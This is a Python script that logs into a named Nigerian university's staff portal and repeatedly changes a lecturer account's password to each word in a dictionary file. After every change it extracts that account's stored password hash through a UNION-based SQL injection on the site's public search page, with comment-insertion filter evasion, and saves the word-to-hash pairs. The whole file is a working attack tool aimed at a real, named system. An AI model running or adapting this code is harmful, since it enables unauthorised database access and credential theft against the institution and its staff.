# CodeName: rehash.py
# Author: Dahir Muhammad Dahir
# Date: 14th-May-2018
# About: i will tell u later

import os
from bs4 import BeautifulSoup as bs
import re
import argparse
import requests
import random
import sys
reload(sys)


sys.setdefaultencoding("utf8")
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

thisDir = os.getcwd()
letters = "abcdefghijklmnopqrstuvwxyz"
controlPattern = r"\s--\s"
pattern = r"\s"
hashPattern = re.compile(r"staff\.php\?id=")


def main():
	try:
		parser = argparse.ArgumentParser(description="I will tell u later")
		parser.add_argument("-f", "--filename", help="the dictionary file use", required=True)
		parser.add_argument("-u", "--username", help="username to use for login", required=True)
		parser.add_argument("-p", "--password", help="password to use for login")
		args = parser.parse_args()
		rehash(args.filename, args.username, args.password)
	except KeyboardInterrupt as e:
		errorControl(e)
	except Exception as e:
		errorControl(e)


def rehash(filename, username, password=None):
	try:
		cleanWords = []

		with open(filename, "rb") as f:
			words = f.readlines()

		for word in words:
			word = word.strip("\n").strip(" ")
			cleanWords.append(word)

		if not password:
			if not os.path.exists(thisDir+"/lastpass.dmd"):
				with open(thisDir+"/lastpass.dmd", "w") as f:
					pass

			with open(thisDir+"/lastpass.dmd") as f:
				password = f.readline().strip("\n")

		loginPayload = {"exampleInputEmail1":username, "exampleInputPassword1":password, "submitLogin":""}

		loginUrl = "https://staff.bazeuniversity.edu.ng/login.php"
		changePassUrl = "https://staff.bazeuniversity.edu.ng/lecturer/info_update.php?p=TVVtTkRvYW9XOWV3ZFV6THRwMjJiUT09"
		success = "Passwords updated successfully"
		failure = "Sorry old password is wrong"

		with open(thisDir+"/%s_withHashes.dmd"%(filename[:-4]), "ab") as f:
			with requests.Session() as s:
				login = s.post(loginUrl, data=loginPayload)
				if login.status_code == 200 and "Lecturer" in login.content:
					lastKnownPassword = password
					print("Processing...")
					for word in cleanWords:
						changePassPayload = {"oldPassword":lastKnownPassword, "newPassword":word, "confirmPassword":word, "psubmit":""}
						changePass = s.post(changePassUrl, data=changePassPayload)
						if success in changePass.content:
							lastKnownPassword = word
							save(word)
							passHash = getPassHash(username)
						else:
							print("please check something is wrong with the password change process")
							exit()

						if passHash:
							f.write("%s ==> %s\n"%(word, passHash))
				else:
					print("Invalid login Credentials...")
					exit()
		with open(thisDir+"/lastpass.dmd", "wb") as f:
			f.write(lastKnownPassword)
		print("Completed Successfully...")
	except Exception as e:
		errorControl(e)


def getPassHash(username):
	try:
		payload = "xzqs' UNION SELECT 1,password,3,4,5,6,7,8,9,10,11,12,13,14,15 from staff_login where staff_id='%s' -- a"%(username)
		payload = cleanPayload(payload)
		url = "https://bazeuniversity.edu.ng/search/search.php?q="
		with requests.Session() as s:
			getHash = s.get(url+payload)
			page = getHash.content

		soup = bs(page, "html.parser")
		clean = soup.prettify("utf8")
		soup = bs(clean, "html.parser")

		a_tags = soup.find_all("a", attrs={"href":hashPattern})
		for tag in a_tags:
			soup = bs(str(tag), "html.parser")
			hashed = soup.find("a").string
			hash = hashed.strip("\n").strip(" ").strip("\n").strip("\n")
			return hash
	except Exception as e:
		errorControl(e)


def cleanPayload(payload):
	try:
		controlledPayload = re.sub(controlPattern, "ayilaR", payload)
		cleanPayload = re.sub(pattern, "/*%s*/"%("".join(random.sample(letters, 4))), controlledPayload)
		finalPayload = re.sub("ayilaR", " -- ", cleanPayload)
		return finalPayload
	except Exception as e:
		errorControl(e)


def save(word):
	with open(thisDir+"/lastpass.dmd", "wb") as f:
		f.write(word)


def errorControl(error):
	print(error)
	print("Exiting cleanly")
if __name__ == '__main__':
	main()
